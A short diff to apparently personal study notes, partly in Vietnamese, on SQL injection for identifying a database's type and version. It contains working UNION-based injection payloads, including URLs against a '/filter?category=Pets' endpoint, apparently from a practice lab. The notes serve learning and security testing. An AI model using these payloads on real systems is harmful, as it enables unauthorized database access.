@@ -80,10 +80,9 @@ Oracle	          | SELECT * FROM v$version
 PostgreSQL	      | SELECT version()
 For example, use a UNION attack with the following input: ' UNION SELECT @@version--
 !!!!!!!!!! đôi khi cần thêm khoảng trắng ở cuối (sau dấu --) có lẽ đối với csdl MySQL !!!!! 
-
-
-
-
-
+để xác định được kiểu database type và version thì ta cũng cần phải làm các bước trước, xác định số cột của csdl, kiểu dl của từng
+cột, sau đó truy vấn như bình thường, truy vấn cho csdl sẽ chiếm 1 cột:
+.../filter?category=Pets' union select @@version, 'b'-- -
+.../filter?category=Pets' union select @@version, @@version-- -
 
 
